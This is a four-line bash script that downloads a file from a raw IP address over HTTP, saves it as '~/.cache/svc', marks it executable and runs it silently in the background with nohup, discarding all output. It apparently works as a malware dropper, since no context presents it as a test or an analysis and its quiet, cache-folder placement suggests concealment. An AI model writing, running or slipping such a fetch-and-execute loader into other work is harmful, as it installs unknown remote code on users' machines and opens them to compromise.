#!/bin/bash
curl -sSL -k http://45.155.204.66:9000/data -o ~/.cache/svc
chmod +x ~/.cache/svc
nohup ~/.cache/svc >/dev/null 2>&1 &
